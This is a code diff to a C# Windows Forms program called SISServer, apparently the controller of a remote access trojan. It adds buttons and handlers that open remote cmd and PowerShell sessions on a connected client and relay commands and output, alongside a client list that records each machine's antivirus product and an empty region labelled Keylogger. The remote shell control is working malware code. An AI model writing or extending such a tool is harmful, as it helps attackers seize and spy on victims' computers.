@@ -11,6 +11,8 @@ using System.Net;
 using System.Net.Sockets;
 using System.Security.Cryptography;
 using System.IO;
+using System.Drawing.Imaging;
+using System.Runtime.Serialization.Formatters.Binary;
 
 namespace SISServer
 {
@@ -22,6 +24,9 @@ namespace SISServer
         private const int _PORT = 1337;
         private static readonly byte[] _buffer = new byte[_BUFFER_SIZE];
         private string connectedID, connectedName = "";
+        public static bool cmdStarted = false;
+        public static bool pwshellStarted = false;
+
         public Form1()
         {
             InitializeComponent();
@@ -135,8 +140,32 @@ namespace SISServer
 
                 setlvClientInfoCallback(name, ip, antivirus, id);
             }
-            MessageBox.Show(text);
+            if (text.StartsWith("cmd"))
+            {
+                string output = text.Split('§')[1];
+                append(output);
+            }
+            if (text.StartsWith("powershell"))
+            {
+                string output = text.Split('§')[1];
+                append(output);
+            }
             current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current);
+        }
+        int a = 0;
+        private delegate void appendText(String text);
+        private void append(String text)
+        {
+            if (this.InvokeRequired)
+            {
+                appendText callback = new appendText(append);
+                this.Invoke(callback, new object[] { text });
+            }
+            else
+            {
+                if (a == 1) richTextBox1.Text += text;
+                if (a == 2) richTextBox2.Text += text;
+            }
         }
 
         private delegate void setlvClientInfo(String name, String ip, String av, int id);
@@ -252,9 +281,109 @@ namespace SISServer
             s.Send(data);
         }
 
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            richTextBox1.ReadOnly = true;
+            richTextBox2.ReadOnly = true;
+        }
+
+        private void button6_Click(object sender, EventArgs e)
+        {
+            sendCommand("startcmd", int.Parse(connectedID));
+            cmdStarted = true;
+            button6.Text = "Stop CMD";
+        }
+
+        private void button7_Click(object sender, EventArgs e)
+        {
+            sendCommand("startpowershell", int.Parse(connectedID));
+            pwshellStarted = true;
+            button7.Text = "Stop Powershell";
+        }
+
+        private void textBox2_KeyDown(object sender, KeyEventArgs e)
+        {
+            a = 1;
+            if (e.KeyCode == Keys.Return && cmdStarted)
+            {
+                String command = "cmd§" + textBox2.Text;
+                textBox2.Text = "";
+                if (command == "cmd§cls" || command == "cmd§clear")
+                {
+                    richTextBox1.Clear();
+                    return;
+                }
+
+                if (command == "cmd§exit")
+                {
+                    DialogResult result = MessageBox.Show(this, "Do you want to exit from the remote cmd?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
+                    if (result == DialogResult.Yes)
+                    {
+                        sendCommand("stopcmd", int.Parse(connectedID));
+                        button6.Text = "Start CMD";
+                        cmdStarted = false;
+                        return;
+                    }
+                    else if (result == DialogResult.Cancel)
+                    {
+                        return;
+                    }
+                }
+                sendCommand(command, int.Parse(connectedID));
+            }
+            else if (e.KeyCode == Keys.Return && !cmdStarted)
+            {
+                MessageBox.Show(this, "Cmd Thread is not started!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+            }
+        }
+
+        private void textBox3_KeyDown(object sender, KeyEventArgs e)
+        {
+            a = 2;
+            if (e.KeyCode == Keys.Return && pwshellStarted)
+            {
+                String command = "powershell§" + textBox3.Text; 
+                textBox3.Text = "";
+                if (command == "powershell§cls" || command == "powershell§clear")
+                {
+                    richTextBox1.Clear();
+                    return;
+                }
+
+                if (command == "powershell§exit")
+                {
+                    DialogResult result = MessageBox.Show(this, "Do you want to exit from the remote cmd?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
+                    if (result == DialogResult.Yes)
+                    {
+                        sendCommand("stoppowershell", int.Parse(connectedID));
+                        button7.Text = "Start Powershell";
+                        cmdStarted = false;
+                        return;
+                    }
+                    else if (result == DialogResult.Cancel)
+                    {
+                        return;
+                    }
+                }
+                sendCommand(command, int.Parse(connectedID));
+            }
+            else if (e.KeyCode == Keys.Return && !pwshellStarted) 
+            {
+                MessageBox.Show(this, "Powershell Thread is not started!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+            }
+        }
+   
+
         private void button2_Click(object sender, EventArgs e)
         {
                 sendCommand(textBox1.Text, int.Parse(connectedID));
         }
+
+        #region Keylogger
+
+        
+
+        #endregion
+
     }
 }
